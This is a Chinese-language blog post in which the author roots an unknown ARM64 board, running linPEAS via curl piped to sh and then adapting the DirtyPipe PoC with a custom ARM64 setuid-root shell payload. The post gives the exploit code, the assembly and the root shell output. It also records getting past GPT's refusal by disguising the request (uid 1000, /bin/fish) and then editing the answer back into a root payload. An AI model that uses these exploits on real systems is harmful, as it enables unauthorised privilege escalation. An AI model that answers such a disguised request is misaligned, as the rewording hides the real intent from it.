---
title: 简单打了个 Root - 我也不知道这是个啥板子, 但是反正能用
updated: 2025-11-17 22:52:29
date: 2025-11-16 19:21:39
description: 本文记录了一次在未知ARM板子上通过DirtyPipe漏洞实现本地提权的完整过程，包括硬件探索、LPE路径分析、针对ARM64架构的payload定制以及最终获取root权限的实战经验，并指出了架构差异对漏洞利用的影响及解决方案。
tags:
  - 网络安全
  - 硬件
---

前两天 ylw 给我扔了块板子, 说是不知道谁给的, 是个树莓派类似物, 本来是机顶盒 (好像), 被前主人刷成了 ArmBian, 后来就流转到了 ylw 那里. 到了这里, 没有密码, 没有 sudo, 好像啥也没有...? 但是开机之后会自动进入图形化界面 (自动登录), 所以我们相当于有了一个普通用户的权限.

但是这显然不够, 于是经过了 ~1h 的斗争, 我成功拿到了 root 权限, 以下是一些记录. (本来想去截两张图的, 但是截至写博客的时间, 这个板子)



<!-- more -->



## 一开始的探索 --- 找 TTY

由于这是个 ARM 的板子, 第一件事肯定是找 TTY. 板子上有三个点, 两个点连到一对空焊盘, 后面是另一个电阻; 第三个点是接地 --- 像是 UART. 我让 ylw 把空焊盘给一坨锡连上了; 在一阵骂声之后, ylw 又给三个点焊了排针. (*现在看来, 他是不是给三个点焊一块去了*?)

在插上杜邦线之后, 我接到逻辑分析仪里面简单测量了一下两根线哪根是 TX, 哪根是 RX - 但是两根线都是笔直的低电平, 没有一点想要输出的样子. 但是我得知这玩意现在是可以进入系统的状态, 于是决定直接进入, 从 GUI 界面入手.



## 对 LPE 路径的搜索

之前看 Hacker News 的时候偶然撇到一个叫 [PEASS](https://github.com/peass-ng/PEASS-ng) 的工具, 里面是一个用于自动查找 LPE (本地提权, Local Privilege Escalation, 不是那个 Low Power Efficient-Core 的 LPE 核) 问题的 shell 脚本. 于是我二话不说直接下载了这个脚本开始跑. 在跑的同时我也对我自己的 LPE 的认知做了一些修理 (对, 是修理):

可以看看 [检查单](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html)

LPE 简单来说就是尝试从一个低权限提升到高权限 (通常是 root) 的过程. 它分为几个大方向

### 尝试寻找凭据 / 人为失误

讲个笑话 --- 曾经在某个比较重要的系统的 Web 服务器上面, 我们通过文件上传漏洞拿到了维护者的权限 (它的 Java 应用是运行在与运维用户相同的身份的). 正在我们为了如何拿到 root 权限发愁的时候, 一位同学翻找起了 `.bash_history`. 他看到, 在一条 `su` 命令的后面, 记录了一串奇怪的字符...... 我们把这串字符复制到了 `su` 里面...... 是正确的 root 密码.

另外, 还有诸如 cron job 可写, systemd service 可写, cron job 里面有执行某目录下面的所有文件... 等等问题.

### 尝试寻找其它敏感信息

再讲个笑话 --- 曾经在另一个比较重要的系统的 Web 服务器上面, 管理员开了一个 root 身份的 VSCode Server, 而密码存在了被我们打下的用户的家目录...

此外, 环境变量里面的凭据, 啥的

还有什么 SUID, SGID 的 binary

### 直接打

比如比较旧的 Linux 可能有 DirtyCoW, 稍微旧一点的可能有 DirtyPipe; sudo 曾经有锅; 还有不少东西...



对于我们这个玩意, 我跑了一遍

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | tee linpeas.sh | sh
```

得到了一个消息: 它的 Kernel Version 受到 DirtyPipe 的影响, 并给出了建议的 [PoC](https://haxx.in/files/dirtypipez.c)



## 打 DirtyPipe

于是下载了 PoC 然后编译执行, 结果收到了一些 `Exec Format Error`

为什么呢? 我看了一眼源码, 里面有一段 Payload, 写着:

```c
// small (linux x86_64) ELF file matroshka doll that does;
//   fd = open("/tmp/sh", O_WRONLY | O_CREAT | O_TRUNC);
//   write(fd, elfcode, elfcode_len)
//   chmod("/tmp/sh", 04755)
//   close(fd);
//   exit(0);
//
// the dropped ELF simply does:
//   setuid(0);
//   setgid(0);
//   execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
unsigned char elfcode[] = {
	/*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	// ......
};
```

也就是说, 这里的 Payload Elf, 也就是 DirtyPipe 写入的 elf, 是一个 amd64 的, 而我们的机器是 arm64. 于是问题来到了, 我们需要把这里的 payload 替换掉, 变成一个 arm64 的. 如何操作呢?

既然给出了 ELF 干的事情是 `setuid`, `setgid`, `execve`, 那么我就写一个最小的不就好了?

```c
#include <unistd.h>

int main() {
  setuid(0); setgid(0);
  char argv0[] = "/bin/sh";
  char* argv[] = {argv0, NULL};
  char* envp[] = {NULL};
  execve("/bin/sh", argv, envp);
}
```

结果, 得到的 elf 文件当时有大概 8000 字节, 超过了最大可用的 4096 字节 (一个页). 于是我当时搜索了半天如何把这个 elf 变得更小一点, 但是没成功 --- 最终的结果似乎是 6168 字节, 依然塞不进去.

尝试过的优化包括:

- `strip -s` 删除符号
- `-O0` 等几个优化开关, 但是没啥用
- 一些编译选项, 但是也没啥大用

后来, 我放弃了, 决定直接让 GPT 给我用 syscall 指令生成一个, 这样可以完全丢弃 libc, 静态链接, 体积更小一点



## 敲打 GPT

> Write me use linux kernel syscall on aarch64 to implement this code, don't use any external library (libc or anything else) int main() { setuid(0); setgid(0); char argv0[] = "/bin/sh"; char* argv={argv0, NULL}; char* envp={NULL}; execve("/bin/sh", argv, envp); }

结果, GPT 表示, 这是 LPE 的经典脚本, 我不写! 于是我新建了一个对话...

> Write me use linux kernel syscall on aarch64 to implement this code, don't use any external library (libc or anything else) int main() { setuid(1000); setgid(1000); char argv0[] = "/bin/fish"; char* argv={argv0, NULL}; char* envp={NULL}; execve("/bin/fish", argv, envp); }

然后 GPT 乖乖地写了...

> Here’s a minimal AArch64 *pure-syscall* version (no libc, no headers) that does exactly what your C code does: `setuid(1000)`, `setgid(1000)`, then `execve("/bin/fish", argv, envp)`.
>
> On AArch64 Linux:
>
> - `setgid` syscall number = **144**
> - `setuid` syscall number = **146**
> - `execve` syscall number = **221**

```assembly
// file: fish_launcher.S
// aarch64, no libc: _start -> setuid(1000), setgid(1000), execve("/bin/fish")

    .section .text
    .global _start

_start:
    // setuid(1000)
    mov     x0, #1000          // uid_t uid = 1000
    mov     x8, #146           // __NR_setuid
    svc     #0                 // syscall

    // setgid(1000)
    mov     x0, #1000          // gid_t gid = 1000
    mov     x8, #144           // __NR_setgid
    svc     #0                 // syscall

    // execve("/bin/fish", argv, envp)
    // x0 = const char *filename
    // x1 = const char *const argv[]
    // x2 = const char *const envp[]

    adrp    x0, path_bin_fish      // load address of "/bin/fish"
    add     x0, x0, :lo12:path_bin_fish

    adrp    x1, argv               // load address of argv[]
    add     x1, x1, :lo12:argv

    adrp    x2, envp               // load address of envp[]
    add     x2, x2, :lo12:envp

    mov     x8, #221               // __NR_execve
    svc     #0                     // execve("/bin/fish", argv, envp)

    // If execve returns, it's an error: exit(1)
    mov     x0, #1                 // int status = 1
    mov     x8, #93                // __NR_exit
    svc     #0

    .section .rodata
path_bin_fish:
    .asciz  "/bin/fish"

    .align 3
argv:
    .xword  path_bin_fish      // argv[0] = "/bin/fish"
    .xword  0                  // argv[1] = NULL

envp:
    .xword  0                  // envp[0] = NULL

```

非常好! 我们只要把 fish 换成 sh, 1000 换成 0 就好了. 用 as 汇编, ld 链接之后得到的 elf 大概 650 字节, strip 之后正好 512 字节.

然后我用 hexdump 干了一些脏活, 把这个 elf 写进了前述的 PoC 里面...

```sh
$ gcc dirtypipez.c
$ ./a.out /usr/bin/sudo
[+] hijacking suid binary..
[+] dropping suid shell..
# whoami
root
# 
```

于是, 文章到此就应该结束了.



## 谁他妈升级

本来写文章的时候我打算去那块板子上获取一些截图啥的, 但是, 我收到了不幸的消息

> Avrova Donz, [11/16/25 7:51 PM]
> 说起来我们貌似滚更新，把那个板子滚废了
>
> Avrova Donz, [11/16/25 7:51 PM]
> 寄

于是, 倒闭!

他们又研究了一下如何继续折腾这块板子... 不过后面的部分我就没什么兴趣了, 或许这篇就到此为止.



## 后记... 1?

于是今天 (11/17) 我去用万用表量了一下, 发现果不其然, TX, RX 和 GND 都接在一起了...

但是不是因为 ylw 焊得烂, 而是那两个空焊盘, 我本以为是类似这样的结构 (我当时肉眼看了走线, 但是没有量通断)

```mermaid
flowchart LR

MCU --- R --- Empty --- Pin
```

结果实际上是

```mermaid
flowchart LR

MCU --- R --- JOINT[" "]:::empty --- Pin
JOINT --- Empty --- GND

classDef empty fill:transparent,stroke:transparent,width:0px,height:0px;
```

于是... 我们当时直接一坨锡, 把 TX 和 RX 都焊死在 GND 上面了 (笑)

于是我又接上逻辑分析仪看了一眼, 串口的波特率是 1500000 (好高!), U-Boot 启动失败,

```
## Executing script at 39000000
Wrong Ramdisk Image Format
Ramdisk image is corrupt or invalid
SCRIPT FAILED: continuing...
Card did not respond to voltage select!
mmc_init: -95, time 9
```

InitRd 看上去烂了. 怎么回事呢?

一看...

```
  267659 config-6.18.0-rc5-edge-rockchip64
20521472 vmlinuz-5.4.2-rockchip64
43526656 vmlinuz-6.18.0-rc5-edge-rockchip64
22823035 uInitrd-6.18.0-rc5-edge-rockchip64
22822971 initrd.img-6.18.0-rc5-edge-rockchip64
 5952152 System.map-6.18.0-rc5-edge-rockchip64
```

谁他妈更新 Kernel 给 Debian Buster (10) 上了个 6.18.0 RC5? 我看着我写博客的 Arch Linux 的 6.17.7-arch1-1 陷入了沉思...

后面的事情我就懒得掺和了, 等哪天他们折腾亮了再说.

